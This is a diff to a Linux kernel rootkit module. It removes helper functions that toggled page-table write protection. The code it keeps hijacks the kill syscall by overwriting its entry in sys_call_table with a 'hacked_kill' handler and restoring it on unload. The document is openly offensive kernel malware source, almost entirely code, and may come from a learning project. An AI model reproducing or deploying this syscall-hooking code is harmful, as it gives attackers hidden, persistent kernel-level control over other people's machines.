@@ -47,39 +47,18 @@ asmlinkage int hacked_kill(pid_t pid, int sig)
 	return actual_result;
 }
 
-int make_writable(unsigned long add)
-{
-	unsigned int level;
-	pte_t *pte = lookup_address(add,&level);
-	if (pte->pte &~ _PAGE_RW)
-		pte->pte = pte->pte | _PAGE_RW;
-	return 0;
-}
-
-int make_write_protected(unsigned long add)
-{
-	unsigned int level;
-	pte_t *pte = lookup_address(add,&level);
-	pte->pte = pte->pte &~ _PAGE_RW;
-	return 0;
-}
-
 int rootkit_init(void) {
-	//make_writable((unsigned long)sys_call_table);
 	GPF_DISABLE;
 	orig_kill = (kill_ptr)sys_call_table[__NR_kill];
 	sys_call_table[__NR_kill] = (unsigned long)hacked_kill;
-	//make_write_protected((unsigned long)sys_call_table);
 	GPF_ENABLE;
 	printk(KERN_INFO "Loading rootkit\n");
     	return 0;
 }
 
 void rootkit_exit(void) {
-	//make_writable((unsigned long)sys_call_table);
 	GPF_DISABLE;
 	sys_call_table[__NR_kill] = (unsigned long)orig_kill;
-	//make_write_protected((unsigned long)sys_call_table);
 	GPF_ENABLE;
 	printk(KERN_INFO "Removing rootkit\n");
 }
